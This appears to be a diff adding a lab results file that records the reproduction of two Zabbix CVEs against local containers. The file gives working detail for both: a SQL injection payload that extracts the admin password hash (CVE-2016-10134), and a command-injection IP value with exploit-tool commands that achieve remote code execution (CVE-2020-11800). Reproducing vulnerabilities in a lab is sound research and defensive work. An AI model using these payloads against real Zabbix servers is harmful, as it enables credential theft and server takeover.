@@ -1,0 +1,48 @@
+{
+  "lab": {
+    "date": "2026-10-28",
+    "network_303": "zbx-old-303",
+    "network_3030": "zbx-old-3030",
+    "containers": ["zlab_303_db", "zlab_303_server", "zlab_303_web", "zlab_3030_db", "zlab_3030_server", "zlab_3030_web"],
+    "images": {
+      "3.0.3": {"tag": "zlab-old-zabbix:3.0.3", "image_id": "444bad44fc71"},
+      "3.0.30": {"tag": "zlab-old-zabbix:3.0.30", "image_id": "48030d82c985"}
+    },
+    "source": "https://cdn.zabbix.com/zabbix/sources/oldstable/3.0/zabbix-3.0.3.tar.gz (oldstable CDN; stable/3.0 404s)",
+    "db": "mysql:5.6, schema.sql+images.sql+data.sql (order matters: data has FK to images)",
+    "note": "built from source; no official docker images < 3.0.4"
+  },
+  "CVE-2016-10134": {
+    "version": "3.0.3",
+    "result": "exploited",
+    "target": "http://127.0.0.1:18080 (web)",
+    "api_version": "3.0.3",
+    "vector": "jsrpc.php screen.get profileIdx2 -> INSERT INTO profiles idx2 unescaped -> error-based updatexml",
+    "unauth": true,
+    "guest_session": "userid=2 auto-login enables CProfile flush",
+    "query": "SELECT passwd FROM users WHERE userid=1",
+    "extracted": "5fce1b3e34b520afeffb37ce08c7cd666",
+    "extracted_is": "MD5('zabbix') = Admin default password hash",
+    "sql_response_snippet": "Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (2, 2, 'web.item.graph.period', '3600', 2, updatexml(0,concat(0x7e,(SELECT passwd FROM users WHERE userid=1),0x7e),0))] [Unknown column ...]",
+    "commands": [
+      "python3 -m zbxscan.cli -m active -t 127.0.0.1:18080 -exp CVE-2016-10134"
+    ]
+  },
+  "CVE-2020-11800": {
+    "version": "3.0.30",
+    "result": "exploited",
+    "target": "trapper 127.0.0.1:18052 (server 10051), web 127.0.0.1:18081",
+    "api_version": "3.0.30",
+    "vector": "trapper active-checks ip='ffff:::;<cmd>' (is_ip6 dcolon bug) -> auto-registration stores injected ip as host interface -> command scriptid=1 Ping {HOST.CONN} executes server-side -> RCE uid zabbix",
+    "autoreg_enabled": true,
+    "autoreg_sql": "INSERT INTO actions (eventsource=2,status=0) + INSERT INTO operations (operationtype=2 'Add host')",
+    "registered_host": {"hostid": 10108, "hostname": "zbxautof5bcef", "interface_ip": "ffff:::;touch${IFS}/tmp/success11800m"},
+    "command_response": {"response": "success", "data": "ping: unknown host ffff:::\n"},
+    "markers": ["/tmp/success11800 (host 10106)", "/tmp/success11800m (host 10108)"],
+    "marker_owner": "uid=zabbix in zlab_3030_server",
+    "commands": [
+      "python3 -m zbxscan.cli -m active -t 127.0.0.1:18052 -exp CVE-2020-11800 --cmd 'touch /tmp/success11800m' --trap-port 18052",
+      "sg docker -c \"docker exec zlab_3030_server ls -la /tmp/success11800m\""
+    ]
+  }
+}
